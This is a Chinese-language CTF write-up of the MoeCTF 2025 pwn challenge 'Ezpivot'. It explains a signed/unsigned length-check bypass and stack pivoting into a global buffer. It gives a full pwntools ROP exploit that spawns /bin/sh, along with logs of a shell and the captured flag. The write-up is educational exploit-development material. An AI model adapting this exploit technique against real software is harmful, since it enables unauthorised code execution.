---
title: 'XiDianCTF MoeCTF 2025 PWN Ezpivot'
date: '2026-09-08T18:28:45+08:00'
lastmod: '2026-09-08T18:28:45+08:00'
summary: ""
hideSummary: true
draft: false
author: "QingKong996"
categories:
  - "CTF"
tags:
  - "CTF"
  - "Pwn"
---

```
本文为人工撰写，仅使用生成式AI校对。
```

[题目链接](https://ctf.xidian.edu.cn/training/22?challenge=926)

IDA。

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  unsigned int v4; // [rsp+0h] [rbp-10h] BYREF
  char buf[12]; // [rsp+4h] [rbp-Ch] BYREF

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  puts("Welcome to join this pwn party!");
  puts("Please say something to introduce yourself:");
  puts("Before that,you need to tell us the length of your introduction.");
  __isoc99_scanf("%d", &v4);
  if ( (int)v4 > 32 )
  {
    puts("Your introduction is too long, please try again.");
    exit(1);
  }
  introduce(v4);
  puts("Now, please tell us your phone number:");
  read(0, buf, len_of_phonenum);
  return 0;
}
```

注意到`v4`的类型为无符号int，在判断`v4 > 32`的时候强制转换为`int`类型进行比较，并且`read()`函数接受长度类型为`size_t`，所以我们可以输入`-1`绕过检查。

```c
int __fastcall introduce(unsigned int a1)
{
  read(0, &desc, a1);
  return puts("Ok,we got your introduction!");
}
```

并且注意到

```
.data:0000000000404010                 public len_of_phonenum
.data:0000000000404010 len_of_phonenum dd 1Ch                  ; DATA XREF: main+E8↑r
.data:0000000000404010 _data           ends
.data:0000000000404010
```

`len_of_phonenum`的默认值为0x1c = 28 = 12 + 8 + 8，恰好满足一次`ret`。

>  根据题目提示，本题为`stack pivoting`[^Stack Pivoting]。



```c
int backdoor()
{
  return system("echo moectf{WowYouGetTheFlag}");
}
```

这里有用的只有`system()`，需要我们自己构造字符串作为参数。



我们需要在`desc`缓冲区写入我们希望在栈里填充的数据，比如`/bin/sh`和各种地址。

然后再调整`$RSP`到desc中伪造的栈的栈顶实现伪造栈帧。

但我们还需要为栈预留扩展的空间，所以我们要调高栈顶，直接填充任意值即可。

```python
from pwn import *
import ctypes
import shutil
import logging

pwndbg = shutil.which("pwndbg")

context(arch='amd64', os='linux', log_level='debug')
# context.binary = elf = ELF("./pwn", checksec=False)
# context.terminal = ["tmux", "splitw", "-h"]

# context.gdb_binary = pwndbg

# io = gdb.debug(
#         elf.path,
#         gdbscript="""
#         set pagination off
#         set disassembly-flavor intel
#         
#         b main
#         """
#         )

io = connect("127.0.0.1",3552)

io.recvuntil(b'duction.')
io.sendline(str("-1").encode())

pop_rdiAdd = 0x401219
leaveAdd = 0x40120f
discAdd = 0x404060
systemAdd = 0x401230
retAdd = 0x40101a

io.sendline(b'\00' * 0x708 + p64(discAdd + 0x808) + p64(pop_rdiAdd) + p64(discAdd + 0x708 + 0x8 * 5) + p64(retAdd) + p64(systemAdd) + b'/bin/sh\00')

io.recvuntil(b'number:')
io.sendline(b'A' * 12 + p64(discAdd + 0x708) + p64(leaveAdd))


io.interactive()
```

> 这里很神奇，如果只偏移`0x608`，进入`system()`调用后会向低位移动`$RSP`致使访问到`desc`以上造成段错误。

输出:

```
[x] Opening connection to 127.0.0.1 on port 3552
[x] Opening connection to 127.0.0.1 on port 3552: Trying 127.0.0.1
[+] Opening connection to 127.0.0.1 on port 3552: Done
[DEBUG] Received 0x8d bytes:
    b'Welcome to join this pwn party!\n'
    b'Please say something to introduce yourself:\n'
    b'Before that,you need to tell us the length of your introduction.\n'
[DEBUG] Sent 0x3 bytes:
    b'-1\n'
[DEBUG] Sent 0x739 bytes:
DEBUG:pwnlib.tubes.remote.connect.1723829106880:Sent 0x739 bytes:
    00000000  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    *
    00000700  00 00 00 00  00 00 00 00  68 48 40 00  00 00 00 00  │····│····│hH@·│····│
    00000710  19 12 40 00  00 00 00 00  90 47 40 00  00 00 00 00  │··@·│····│·G@·│····│
    00000720  1a 10 40 00  00 00 00 00  30 12 40 00  00 00 00 00  │··@·│····│0·@·│····│
    00000730  2f 62 69 6e  2f 73 68 00  0a                        │/bin│/sh·│·│
    00000739
DEBUG:pwnlib.tubes.remote.connect.1723829106880:00000000  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
*
00000700  00 00 00 00  00 00 00 00  68 48 40 00  00 00 00 00  │····│····│hH@·│····│
00000710  19 12 40 00  00 00 00 00  90 47 40 00  00 00 00 00  │··@·│····│·G@·│····│
00000720  1a 10 40 00  00 00 00 00  30 12 40 00  00 00 00 00  │··@·│····│0·@·│····│
00000730  2f 62 69 6e  2f 73 68 00  0a                        │/bin│/sh·│·│
00000739
[DEBUG] Received 0x1c bytes:
DEBUG:pwnlib.tubes.remote.connect.1723829106880:Received 0x1c bytes:
    b'Ok,we got your introduction!'
DEBUG:pwnlib.tubes.remote.connect.1723829106880:b'Ok,we got your introduction!'
[DEBUG] Received 0x28 bytes:
DEBUG:pwnlib.tubes.remote.connect.1723829106880:Received 0x28 bytes:
    b'\n'
DEBUG:pwnlib.tubes.remote.connect.1723829106880:b'\n'
    b'Now, please tell us your phone number:\n'
DEBUG:pwnlib.tubes.remote.connect.1723829106880:b'Now, please tell us your phone number:\n'
[DEBUG] Sent 0x1d bytes:
DEBUG:pwnlib.tubes.remote.connect.1723829106880:Sent 0x1d bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  68 47 40 00  │AAAA│AAAA│AAAA│hG@·│
    00000010  00 00 00 00  0f 12 40 00  00 00 00 00  0a           │····│··@·│····│·│
    0000001d
DEBUG:pwnlib.tubes.remote.connect.1723829106880:00000000  41 41 41 41  41 41 41 41  41 41 41 41  68 47 40 00  │AAAA│AAAA│AAAA│hG@·│
00000010  00 00 00 00  0f 12 40 00  00 00 00 00  0a           │····│··@·│····│·│
0000001d
[*] Switching to interactive mode
INFO:pwnlib.tubes.remote.connect.1723829106880:Switching to interactive mode

$ cat flag
[DEBUG] Sent 0x1 bytes:
DEBUG:pwnlib.tubes.remote.connect.1723829106880:Sent ...
DEBUG:pwnlib.tubes.remote.connect.1723829106880:Received ...
moectf{YOU_c@n_n0T-overFLow_enOugh-6ytES73eab8}
[*] Interrupted
INFO:pwnlib.tubes.remote.connect.1723829106880:Interrupted
[*] Closed connection to 127.0.0.1 port 3552
INFO:pwnlib.tubes.remote.connect.1723829106880:Closed connection to 127.0.0.1 port 3552
```





[^Stack Pivoting]:[stack pivoting](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/fancy-rop/#stack-pivoting)
